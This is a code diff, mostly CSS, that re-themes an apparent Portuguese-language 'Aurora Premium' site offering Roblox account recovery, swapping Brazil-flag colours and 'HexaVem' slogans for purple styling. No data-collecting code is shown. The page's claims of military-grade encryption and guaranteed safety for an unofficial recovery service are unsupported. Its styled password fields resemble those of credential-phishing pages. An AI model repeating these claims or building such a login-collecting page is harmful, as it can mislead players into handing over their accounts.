@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Aurora Premium | Dashboard Avançada</title>
+    <title>Aurora Premium | Dashboard Roxa</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Poppins:wght@600;700;800;900&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        /* ===== TODOS OS ESTILOS EXISTENTES ===== */
+        /* ===== TODOS OS ESTILOS ===== */
         * {
             margin: 0;
             padding: 0;
@@ -15,26 +15,26 @@
         }
 
         :root {
-            --primary: #009739;
-            --primary-dark: #00802e;
-            --primary-light: #00b84a;
-            --secondary: #fedc00;
-            --secondary-dark: #f5c800;
+            --primary: #7c3aed;
+            --primary-dark: #5b21b6;
+            --primary-light: #a78bfa;
+            --secondary: #c084fc;
+            --secondary-dark: #9333ea;
             --accent: #ec4899;
             --success: #10b981;
             --warning: #f59e0b;
             --danger: #ef4444;
-            --dark: #0f172a;
-            --darker: #020617;
+            --dark: #0f0a1a;
+            --darker: #05020a;
             --light: #f8fafc;
             --border: #e2e8f0;
             --text: #1e293b;
             --text-light: #64748b;
             --nav-height: 70px;
             --gold: #ffd700;
-            --brazil-green: #009739;
-            --brazil-yellow: #fedc00;
-            --brazil-blue: #012169;
+            --aurora-purple: #7c3aed;
+            --aurora-light: #a78bfa;
+            --aurora-dark: #2d1b69;
         }
 
         html {
@@ -43,14 +43,14 @@
 
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0a1a0a 0%, #1a2a1a 50%, #0a1a0a 100%);
+            background: linear-gradient(135deg, #0a0515 0%, #1a0d2e 50%, #0a0515 100%);
             color: var(--text);
             line-height: 1.6;
             overflow-x: hidden;
             min-height: 100vh;
         }
 
-        /* ===== FUNDO ANIMADO BRASIL ===== */
+        /* ===== FUNDO ANIMADO AURORA ===== */
         .animated-bg {
             position: fixed;
             inset: 0;
@@ -66,12 +66,12 @@
             top: -50%;
             left: -50%;
             background-image:
-                radial-gradient(2px 2px at 20% 30%, #ffd700, transparent),
-                radial-gradient(2px 2px at 40% 70%, #ffd700, transparent),
-                radial-gradient(2px 2px at 60% 20%, #ffd700, transparent),
-                radial-gradient(2px 2px at 80% 80%, #ffd700, transparent),
-                radial-gradient(1px 1px at 10% 50%, #ffd700, transparent),
-                radial-gradient(1px 1px at 90% 40%, #ffd700, transparent);
+                radial-gradient(2px 2px at 20% 30%, #c084fc, transparent),
+                radial-gradient(2px 2px at 40% 70%, #a78bfa, transparent),
+                radial-gradient(2px 2px at 60% 20%, #7c3aed, transparent),
+                radial-gradient(2px 2px at 80% 80%, #8b5cf6, transparent),
+                radial-gradient(1px 1px at 10% 50%, #a78bfa, transparent),
+                radial-gradient(1px 1px at 90% 40%, #7c3aed, transparent);
             background-size: 200px 200px;
             animation: twinkle 4s ease-in-out infinite alternate;
         }
@@ -92,7 +92,7 @@
         .glow-1 {
             width: 500px;
             height: 500px;
-            background: var(--brazil-green);
+            background: var(--aurora-purple);
             top: -15%;
             left: -10%;
         }
@@ -100,7 +100,7 @@
         .glow-2 {
             width: 400px;
             height: 400px;
-            background: var(--brazil-yellow);
+            background: var(--aurora-light);
             bottom: -15%;
             right: -10%;
             animation-delay: -4s;
@@ -109,7 +109,7 @@
         .glow-3 {
             width: 300px;
             height: 300px;
-            background: var(--brazil-blue);
+            background: var(--aurora-dark);
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
@@ -148,12 +148,6 @@
             50% { transform: translateY(-20px); }
         }
 
-        @keyframes floatRotate {
-            0% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-30px) rotate(180deg); }
-            100% { transform: translateY(0) rotate(360deg); }
-        }
-
         @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.5; }
@@ -188,10 +182,10 @@
 
         /* ===== NAVBAR ===== */
         .navbar {
-            background: rgba(10, 26, 10, 0.95);
+            background: rgba(10, 5, 21, 0.95);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border-bottom: 2px solid rgba(254, 220, 0, 0.2);
+            border-bottom: 2px solid rgba(124, 58, 237, 0.2);
             position: sticky;
             top: 0;
             z-index: 1000;
@@ -220,7 +214,7 @@
             gap: 0.5rem;
             font-size: 1.3rem;
             font-weight: 900;
-            background: linear-gradient(135deg, #009739, #fedc00, #012169);
+            background: linear-gradient(135deg, #7c3aed, #a78bfa, #c084fc);
             background-size: 200% 200%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -231,7 +225,7 @@
 
         .nav-logo i {
             font-size: 1.5rem;
-            color: #fedc00;
+            color: #c084fc;
             -webkit-text-fill-color: initial;
         }
 
@@ -265,7 +259,7 @@
             transform: translateX(-50%);
             width: 0;
             height: 2px;
-            background: linear-gradient(90deg, #009739, #fedc00);
+            background: linear-gradient(90deg, #7c3aed, #c084fc);
             transition: width 0.3s ease;
         }
 
@@ -279,13 +273,13 @@
         }
 
         .nav-link.active {
-            color: #fedc00;
-            background: rgba(254, 220, 0, 0.1);
+            color: #c084fc;
+            background: rgba(124, 58, 237, 0.1);
         }
 
         .nav-link.active::before {
             width: 60%;
-            background: #fedc00;
+            background: #c084fc;
         }
 
         .nav-link i {
@@ -343,9 +337,9 @@
             display: inline-flex;
             align-items: center;
             gap: 0.5rem;
-            background: rgba(254, 220, 0, 0.15);
-            border: 1px solid rgba(254, 220, 0, 0.4);
-            color: #fedc00;
+            background: rgba(124, 58, 237, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.4);
+            color: #c084fc;
             padding: 0.5rem 1.2rem;
             border-radius: 50px;
             font-size: 0.8rem;
@@ -361,7 +355,7 @@
             font-weight: 900;
             line-height: 1.1;
             margin-bottom: 1rem;
-            background: linear-gradient(135deg, #fedc00 0%, #009739 40%, #012169 70%, #ffd700 100%);
+            background: linear-gradient(135deg, #c084fc 0%, #7c3aed 40%, #a78bfa 70%, #c084fc 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -375,10 +369,10 @@
             animation: fadeInUp 0.8s ease-out 0.2s both;
         }
 
-        .hero-subtitle .hexa {
-            color: #fedc00;
+        .hero-subtitle .aurora {
+            color: #c084fc;
             font-weight: 900;
-            text-shadow: 0 0 20px rgba(254, 220, 0, 0.3);
+            text-shadow: 0 0 20px rgba(124, 58, 237, 0.3);
         }
 
         .hero-description {
@@ -407,21 +401,21 @@
             color: rgba(255, 255, 255, 0.8);
             font-weight: 600;
             font-size: 0.85rem;
-            background: rgba(254, 220, 0, 0.1);
+            background: rgba(124, 58, 237, 0.1);
             padding: 0.5rem 1.2rem;
             border-radius: 8px;
-            border: 1px solid rgba(254, 220, 0, 0.2);
+            border: 1px solid rgba(124, 58, 237, 0.2);
             transition: all 0.3s ease;
         }
 
         .feature-badge:hover {
-            background: rgba(254, 220, 0, 0.2);
-            border-color: rgba(254, 220, 0, 0.4);
+            background: rgba(124, 58, 237, 0.2);
+            border-color: rgba(124, 58, 237, 0.4);
             transform: translateY(-3px);
         }
 
         .feature-badge i {
-            color: #fedc00;
+            color: #c084fc;
             font-size: 1rem;
         }
 
@@ -460,15 +454,15 @@
         }
 
         .btn-primary {
-            background: linear-gradient(135deg, #009739, #00802e);
+            background: linear-gradient(135deg, #7c3aed, #5b21b6);
             color: white;
-            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
-            border: 1px solid rgba(254, 220, 0, 0.3);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
+            border: 1px solid rgba(192, 132, 252, 0.3);
         }
 
         .btn-primary:hover {
             transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(0, 151, 57, 0.5);
+            box-shadow: 0 15px 40px rgba(124, 58, 237, 0.5);
         }
 
         .btn-primary:active {
@@ -495,7 +489,7 @@
             font-weight: 900;
             text-align: center;
             margin-bottom: 0.8rem;
-            background: linear-gradient(135deg, #fedc00 0%, #009739 40%, #012169 70%, #ffd700 100%);
+            background: linear-gradient(135deg, #c084fc 0%, #7c3aed 40%, #a78bfa 70%, #c084fc 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -521,7 +515,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.15);
             border-radius: 16px;
             padding: 2rem;
             transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
@@ -538,7 +532,7 @@
             right: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle, rgba(0, 151, 57, 0.1) 0%, transparent 70%);
+            background: radial-gradient(circle, rgba(124, 58, 237, 0.1) 0%, transparent 70%);
             opacity: 0;
             transition: opacity 0.4s ease;
         }
@@ -554,15 +548,15 @@
 
         .card:hover {
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(254, 220, 0, 0.4);
+            border-color: rgba(124, 58, 237, 0.4);
             transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(0, 151, 57, 0.25);
+            box-shadow: 0 20px 40px rgba(124, 58, 237, 0.25);
         }
 
         .card-icon {
             width: 60px;
             height: 60px;
-            background: linear-gradient(135deg, #009739, #00802e);
+            background: linear-gradient(135deg, #7c3aed, #5b21b6);
             border-radius: 14px;
             display: flex;
             align-items: center;
@@ -570,7 +564,7 @@
             font-size: 1.7rem;
             color: white;
             margin-bottom: 1.2rem;
-            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
             transition: all 0.3s ease;
         }
 
@@ -604,7 +598,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.15);
             border-radius: 20px;
             padding: 2rem;
             animation: slideInLeft 0.8s ease-out;
@@ -619,7 +613,7 @@
             align-items: center;
             margin-bottom: 2rem;
             padding-bottom: 1.5rem;
-            border-bottom: 1px solid rgba(254, 220, 0, 0.1);
+            border-bottom: 1px solid rgba(124, 58, 237, 0.1);
             flex-wrap: wrap;
             gap: 0.8rem;
         }
@@ -632,13 +626,13 @@
         }
 
         .badge {
-            background: linear-gradient(135deg, #009739, #fedc00);
-            color: #012169;
+            background: linear-gradient(135deg, #7c3aed, #c084fc);
+            color: white;
             padding: 0.4rem 1.2rem;
             border-radius: 50px;
             font-size: 0.75rem;
             font-weight: 900;
-            box-shadow: 0 10px 25px rgba(0, 151, 57, 0.3);
+            box-shadow: 0 10px 25px rgba(124, 58, 237, 0.3);
             animation: bounceIn 0.6s ease-out;
             white-space: nowrap;
         }
@@ -658,7 +652,7 @@
         }
 
         .form-label i {
-            color: #fedc00;
+            color: #c084fc;
             font-size: 1rem;
         }
 
@@ -672,7 +666,7 @@
             width: 100%;
             padding: 0.9rem 1rem;
             background: rgba(255, 255, 255, 0.05);
-            border: 1.5px solid rgba(254, 220, 0, 0.2);
+            border: 1.5px solid rgba(124, 58, 237, 0.2);
             border-radius: 12px;
             color: white;
             font-size: 0.95rem;
@@ -686,8 +680,8 @@
         .form-input:focus {
             outline: none;
             background: rgba(255, 255, 255, 0.08);
-            border-color: rgba(0, 151, 57, 0.6);
-            box-shadow: 0 0 0 4px rgba(0, 151, 57, 0.15);
+            border-color: rgba(124, 58, 237, 0.6);
+            box-shadow: 0 0 0 4px rgba(124, 58, 237, 0.15);
         }
 
         .form-input::placeholder {
@@ -707,7 +701,7 @@
         }
 
         .toggle-btn:hover {
-            color: #fedc00;
+            color: #c084fc;
         }
 
         .form-hint {
@@ -719,8 +713,8 @@
         }
 
         .security-box {
-            background: linear-gradient(135deg, rgba(0, 151, 57, 0.15), rgba(0, 151, 57, 0.05));
-            border: 1.5px solid rgba(0, 151, 57, 0.3);
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.15), rgba(124, 58, 237, 0.05));
+            border: 1.5px solid rgba(124, 58, 237, 0.3);
             border-radius: 12px;
             padding: 1.2rem;
             display: flex;
@@ -730,7 +724,7 @@
         }
 
         .security-box i {
-            color: #00b84a;
+            color: #a78bfa;
             font-size: 1.3rem;
             flex-shrink: 0;
             margin-top: 0.2rem;
@@ -743,7 +737,7 @@
         }
 
         .security-box strong {
-            color: #fedc00;
+            color: #c084fc;
         }
 
         .btn-block {
@@ -752,21 +746,21 @@
 
         .disclaimer {
             text-align: center;
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 0.7rem;
-            line-height: 1.8;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.75rem;
+            line-height: 1.6;
             margin-top: 1.2rem;
         }
 
         .disclaimer a {
-            color: #fedc00;
+            color: #c084fc;
             text-decoration: none;
             font-weight: 700;
             transition: color 0.3s ease;
         }
 
         .disclaimer a:hover {
-            color: #ffd700;
+            color: #a78bfa;
         }
 
         /* ===== BLOQUEIO MESSAGE ===== */
@@ -806,7 +800,7 @@
         .block-message .timer {
             font-size: 2rem;
             font-weight: 900;
-            color: #fedc00;
+            color: #c084fc;
             margin: 0.5rem 0;
         }
 
@@ -821,7 +815,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.15);
             border-radius: 16px;
             padding: 1.5rem;
             animation: slideInRight 0.8s ease-out;
@@ -839,7 +833,7 @@
         }
 
         .info-card h4 i {
-            color: #fedc00;
+            color: #c084fc;
         }
 
         .info-item {
@@ -847,7 +841,7 @@
             justify-content: space-between;
             align-items: center;
             padding: 0.6rem 0;
-            border-bottom: 1px solid rgba(254, 220, 0, 0.05);
+            border-bottom: 1px solid rgba(124, 58, 237, 0.05);
             transition: all 0.3s ease;
         }
 
@@ -866,7 +860,7 @@
         }
 
         .info-value {
-            color: #fedc00;
+            color: #c084fc;
             font-weight: 800;
             font-size: 1rem;
         }
@@ -892,7 +886,7 @@
         }
 
         .features-list i {
-            color: #00b84a;
+            color: #a78bfa;
             font-weight: 700;
         }
 
@@ -902,8 +896,8 @@
             gap: 0.4rem;
             font-size: 0.75rem;
             font-weight: 700;
-            color: #00b84a;
-            background: rgba(0, 151, 57, 0.1);
+            color: #a78bfa;
+            background: rgba(124, 58, 237, 0.1);
             padding: 0.3rem 0.8rem;
             border-radius: 50px;
             width: fit-content;
@@ -925,7 +919,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.15);
             border-radius: 14px;
             overflow: hidden;
             transition: all 0.4s ease;
@@ -942,7 +936,7 @@
 
         .faq-item:hover {
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(0, 151, 57, 0.3);
+            border-color: rgba(124, 58, 237, 0.3);
             transform: translateY(-5px);
         }
 
@@ -958,7 +952,7 @@
         }
 
         .faq-question:hover {
-            background: rgba(0, 151, 57, 0.05);
+            background: rgba(124, 58, 237, 0.05);
         }
 
         .faq-question h3 {
@@ -969,7 +963,7 @@
         }
 
         .faq-question i {
-            color: #fedc00;
+            color: #c084fc;
             transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
             font-size: 1rem;
             flex-shrink: 0;
@@ -978,7 +972,7 @@
 
         .faq-item.active .faq-question i {
             transform: rotate(180deg);
-            color: #009739;
+            color: #7c3aed;
         }
 
         .faq-answer {
@@ -1010,7 +1004,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.15);
             border-radius: 16px;
             padding: 2rem;
             text-align: center;
@@ -1028,7 +1022,7 @@
             right: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle, rgba(254, 220, 0, 0.1) 0%, transparent 70%);
+            background: radial-gradient(circle, rgba(124, 58, 237, 0.1) 0%, transparent 70%);
             opacity: 0;
             transition: opacity 0.4s ease;
         }
@@ -1043,16 +1037,16 @@
 
         .stat-box:hover {
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(254, 220, 0, 0.4);
+            border-color: rgba(124, 58, 237, 0.4);
             transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(254, 220, 0, 0.25);
+            box-shadow: 0 20px 40px rgba(124, 58, 237, 0.25);
         }
 
         .stat-number {
             display: block;
             font-size: clamp(1.8rem, 4vw, 2.8rem);
             font-weight: 900;
-            background: linear-gradient(135deg, #fedc00, #009739);
+            background: linear-gradient(135deg, #c084fc, #7c3aed);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -1078,7 +1072,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.15);
             border-radius: 16px;
             padding: 2rem;
             text-align: center;
@@ -1094,9 +1088,9 @@
 
         .comunidade-card:hover {
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(0, 151, 57, 0.4);
+            border-color: rgba(124, 58, 237, 0.4);
             transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(0, 151, 57, 0.25);
+            box-shadow: 0 20px 40px rgba(124, 58, 237, 0.25);
         }
 
         .comunidade-icon {
@@ -1116,7 +1110,7 @@
         }
 
         .comunidade-icon.discord { background: linear-gradient(135deg, #5865F2, #4752C4); color: white; }
-        .comunidade-icon.email { background: linear-gradient(135deg, #ea4335, #c5221f); color: white; }
+        .comunidade-icon.email { background: linear-gradient(135deg, #7c3aed, #5b21b6); color: white; }
         .comunidade-icon.tiktok { background: linear-gradient(135deg, #000000, #1a1a1a); color: #25f4ee; border: 2px solid #25f4ee; }
 
         .comunidade-card h3 {
@@ -1136,7 +1130,7 @@
         .comunidade-card .btn-comunidade {
             background: rgba(255, 255, 255, 0.05);
             color: rgba(255, 255, 255, 0.8);
-            border: 1.5px solid rgba(254, 220, 0, 0.1);
+            border: 1.5px solid rgba(124, 58, 237, 0.1);
             border-radius: 10px;
             padding: 0.7rem 1.5rem;
             font-weight: 700;
@@ -1153,17 +1147,17 @@
         }
 
         .comunidade-card:hover .btn-comunidade {
-            background: rgba(0, 151, 57, 0.15);
-            border-color: rgba(0, 151, 57, 0.4);
-            color: #fedc00;
+            background: rgba(124, 58, 237, 0.15);
+            border-color: rgba(124, 58, 237, 0.4);
+            color: #c084fc;
         }
 
         .email-info {
             margin-top: 1rem;
             padding: 0.8rem;
-            background: rgba(0, 151, 57, 0.1);
+            background: rgba(124, 58, 237, 0.1);
             border-radius: 10px;
-            border: 1px solid rgba(0, 151, 57, 0.2);
+            border: 1px solid rgba(124, 58, 237, 0.2);
         }
 
         .email-info p {
@@ -1176,7 +1170,7 @@
         }
 
         .email-info i {
-            color: #fedc00;
+            color: #c084fc;
         }
 
         /* ===== TERMS & PRIVACY MODAL ===== */
@@ -1199,10 +1193,10 @@
         }
 
         .terms-modal-content {
-            background: linear-gradient(135deg, rgba(10, 26, 10, 0.98), rgba(26, 42, 26, 0.98));
+            background: linear-gradient(135deg, rgba(10, 5, 21, 0.98), rgba(26, 13, 46, 0.98));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.15);
             border-radius: 20px;
             padding: 2.5rem;
             max-width: 700px;
@@ -1222,7 +1216,7 @@
         }
 
         .terms-modal-content h3 {
-            color: #fedc00;
+            color: #c084fc;
             font-size: 1.1rem;
             font-weight: 700;
             margin: 1.5rem 0 0.8rem;
@@ -1271,13 +1265,13 @@
         }
 
         .terms-modal-content .terms-actions .btn-primary-modal {
-            background: linear-gradient(135deg, #009739, #00802e);
+            background: linear-gradient(135deg, #7c3aed, #5b21b6);
             color: white;
         }
 
         .terms-modal-content .terms-actions .btn-primary-modal:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.4);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.4);
         }
 
         .terms-close-btn {
@@ -1307,7 +1301,7 @@
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.15);
             border-radius: 16px;
             padding: 1.8rem;
             text-align: center;
@@ -1345,7 +1339,7 @@
             justify-content: center;
             font-size: 1.2rem;
             font-weight: 900;
-            color: #fedc00;
+            color: #c084fc;
             z-index: 10;
             border-radius: 16px;
         }
@@ -1357,22 +1351,22 @@
 
         .donation-card:hover:not(.desativado) {
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
-            border-color: rgba(0, 151, 57, 0.3);
+            border-color: rgba(124, 58, 237, 0.3);
             transform: translateY(-8px);
         }
 
         .donation-icon {
             width: 70px;
             height: 70px;
-            background: linear-gradient(135deg, #009739, #fedc00);
+            background: linear-gradient(135deg, #7c3aed, #c084fc);
             border-radius: 16px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 2rem;
-            color: #012169;
+            color: white;
             margin: 0 auto 1.2rem;
-            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
             transition: all 0.3s ease;
         }
 
@@ -1394,19 +1388,19 @@
         }
 
         .btn-secondary {
-            background: rgba(0, 151, 57, 0.15);
-            color: #fedc00;
-            border: 1.5px solid rgba(0, 151, 57, 0.4);
+            background: rgba(124, 58, 237, 0.15);
+            color: #c084fc;
+            border: 1.5px solid rgba(124, 58, 237, 0.4);
             backdrop-filter: blur(10px);
             -webkit-backdrop-filter: blur(10px);
             width: 100%;
         }
 
         .btn-secondary:hover:not(:disabled) {
-            background: rgba(0, 151, 57, 0.25);
-            border-color: rgba(0, 151, 57, 0.6);
+            background: rgba(124, 58, 237, 0.25);
+            border-color: rgba(124, 58, 237, 0.6);
             transform: translateY(-3px);
-            color: #ffd700;
+            color: #a78bfa;
         }
 
         .btn-secondary:disabled {
@@ -1416,8 +1410,8 @@
 
         /* ===== FOOTER ===== */
         .footer {
-            background: rgba(10, 26, 10, 0.95);
-            border-top: 2px solid rgba(254, 220, 0, 0.1);
+            background: rgba(10, 5, 21, 0.95);
+            border-top: 2px solid rgba(124, 58, 237, 0.1);
             padding: 3rem 0 1.5rem;
             margin-top: 4rem;
             position: relative;
@@ -1453,7 +1447,7 @@
         }
 
         .footer-section a:hover {
-            color: #fedc00;
+            color: #c084fc;
             padding-left: 0.3rem;
         }
 
@@ -1464,18 +1458,18 @@
         .footer-bottom {
             text-align: center;
             padding-top: 1.5rem;
-            border-top: 1px solid rgba(254, 220, 0, 0.1);
+            border-top: 1px solid rgba(124, 58, 237, 0.1);
             color: rgba(255, 255, 255, 0.5);
             font-size: 0.8rem;
         }
 
         .footer-bottom i {
-            color: #009739;
+            color: #7c3aed;
             animation: pulse 1.5s ease-in-out infinite;
         }
 
-        .footer-bottom .gold {
-            color: #fedc00;
+        .footer-bottom .aurora {
+            color: #c084fc;
         }
 
         /* ===== MODAL ===== */
@@ -1500,10 +1494,10 @@
 
         .processing-modal,
         .success-modal {
-            background: linear-gradient(135deg, rgba(10, 26, 10, 0.95), rgba(26, 42, 26, 0.95));
+            background: linear-gradient(135deg, rgba(10, 5, 21, 0.95), rgba(26, 13, 46, 0.95));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.15);
             border-radius: 20px;
             padding: 2.5rem;
             max-width: 450px;
@@ -1515,8 +1509,8 @@
         .loader {
             width: 70px;
             height: 70px;
-            border: 4px solid rgba(0, 151, 57, 0.2);
-            border-top: 4px solid #fedc00;
+            border: 4px solid rgba(124, 58, 237, 0.2);
+            border-top: 4px solid #c084fc;
             border-radius: 50%;
             margin: 0 auto 1.5rem;
             animation: spin 1s linear infinite;
@@ -1551,7 +1545,7 @@
 
         .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #009739, #fedc00);
+            background: linear-gradient(90deg, #7c3aed, #c084fc);
             border-radius: 10px;
             animation: progressFill 3s ease-out forwards;
         }
@@ -1565,15 +1559,15 @@
         .success-icon {
             width: 80px;
             height: 80px;
-            background: linear-gradient(135deg, rgba(0, 151, 57, 0.2), rgba(0, 151, 57, 0.05));
-            border: 2px solid rgba(0, 151, 57, 0.4);
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2), rgba(124, 58, 237, 0.05));
+            border: 2px solid rgba(124, 58, 237, 0.4);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 1.5rem;
             font-size: 2.5rem;
-            color: #00b84a;
+            color: #a78bfa;
             animation: bounceIn 0.6s ease-out;
         }
 
@@ -1593,15 +1587,15 @@
         }
 
         .btn-success {
-            background: linear-gradient(135deg, #009739, #00802e);
+            background: linear-gradient(135deg, #7c3aed, #5b21b6);
             color: white;
-            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
             width: 100%;
         }
 
         .btn-success:hover {
             transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(0, 151, 57, 0.5);
+            box-shadow: 0 15px 40px rgba(124, 58, 237, 0.5);
         }
 
         /* ===== BLOQUEIO DE ACESSO ===== */
@@ -1624,7 +1618,7 @@
         }
 
         .block-modal-content {
-            background: linear-gradient(135deg, rgba(10, 26, 10, 0.98), rgba(26, 42, 26, 0.98));
+            background: linear-gradient(135deg, rgba(10, 5, 21, 0.98), rgba(26, 13, 46, 0.98));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
             border: 2px solid rgba(239, 68, 68, 0.4);
@@ -1705,12 +1699,12 @@
                 top: 100%;
                 left: 0;
                 right: 0;
-                background: rgba(10, 26, 10, 0.98);
+                background: rgba(10, 5, 21, 0.98);
                 backdrop-filter: blur(20px);
                 -webkit-backdrop-filter: blur(20px);
                 padding: 1rem 1.5rem;
                 gap: 0.3rem;
-                border-bottom: 2px solid rgba(254, 220, 0, 0.1);
+                border-bottom: 2px solid rgba(124, 58, 237, 0.1);
                 box-shadow: 0 20px 40px rgba(0,0,0,0.3);
             }
 
@@ -1789,7 +1783,7 @@
     </style>
 </head>
 <body>
-    <!-- ===== FUNDO ANIMADO ===== -->
+    <!-- ===== FUNDO ANIMADO AURORA ===== -->
     <div class="animated-bg">
         <div class="stars"></div>
         <div class="glow-orb glow-1"></div>
@@ -1803,7 +1797,7 @@
             <button class="terms-close-btn" onclick="closeTermsModal()">
                 <i class="fas fa-times"></i>
             </button>
-            <h2>🇧🇷 Termos de Serviço & Política de Privacidade</h2>
+            <h2>✨ Termos de Serviço & Política de Privacidade</h2>
             
             <h3>1. Termos de Serviço</h3>
             <p>Ao utilizar a plataforma Aurora Premium, você concorda com os seguintes termos:</p>
@@ -1862,7 +1856,7 @@
         <div class="nav-container">
             <div class="nav-logo" onclick="showSection('home')">
                 <i class="fas fa-star"></i>
-                <span>AURORA PREMIUM</span>
+                <span>AURORA</span>
             </div>
             <div class="nav-menu" id="navMenu">
                 <a class="nav-link active" onclick="showSection('home')"><i class="fas fa-home"></i> Home</a>
@@ -1884,19 +1878,19 @@
             <div class="hero-content">
                 <div class="hero-badge">
                     <i class="fas fa-crown"></i>
-                    🏆 HexaVem! 🇧🇷
+                    ✨ Aurora Premium
                 </div>
-                <h1 class="hero-title">Aurora Premium</h1>
-                <p class="hero-subtitle">Sistema Avançado de Recuperação • <span class="hexa">🏆 HEXAVEM!</span></p>
+                <h1 class="hero-title">Aurora</h1>
+                <p class="hero-subtitle">Sistema Avançado de Recuperação • <span class="aurora">✨ Aurora</span></p>
                 <p class="hero-description">
                     Recupere sua conta Roblox de forma segura, rápida e confiável com nossa plataforma de última geração. 
-                    Tecnologia de ponta, criptografia militar e suporte 24/7 dedicado. <strong style="color:#fedc00;">#HexaVem</strong>
+                    Tecnologia de ponta, criptografia militar e suporte 24/7 dedicado. <strong style="color:#c084fc;">✨ Aurora</strong>
                 </p>
                 <div class="hero-features">
                     <div class="feature-badge"><i class="fas fa-shield-alt"></i> 100% Seguro</div>
                     <div class="feature-badge"><i class="fas fa-bolt"></i> Ultrarrápido</div>
                     <div class="feature-badge"><i class="fas fa-check-circle"></i> Verificado</div>
